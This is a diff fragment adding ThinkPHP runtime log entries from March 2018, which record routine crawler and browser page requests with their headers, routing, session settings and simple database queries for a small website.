+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:39:31+08:00 ] 172.16.0.5 183.136.190.55 GET /index/mv/index.html
+[ log ] www.00it.cn/index/mv/index.html [运行时间：0.023060s][吞吐率：43.37req/s] [内存消耗：2,682.41kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'mv',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000255s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000587s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000157s ]
+[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000154s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T22:33:32+08:00 ] 172.16.0.5 129.78.110.124 GET /
+[ log ] zard-forever.com/ [运行时间：0.015368s][吞吐率：65.07req/s] [内存消耗：1,677.85kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T23:02:52+08:00 ] 172.16.0.5 42.156.139.120 GET /
+[ log ] www.joy-tee.com/ [运行时间：0.015389s][吞吐率：64.98req/s] [内存消耗：1,679.81kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=259200',
+  'host' => 'www.joy-tee.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T23:41:27+08:00 ] 172.16.0.5 66.249.73.4 GET /yxfyfycer.html
+[ log ] zard-forever.com/yxfyfycer.html [运行时间：0.012583s][吞吐率：79.47req/s] [内存消耗：1,356.69kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'yxfyfycer',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
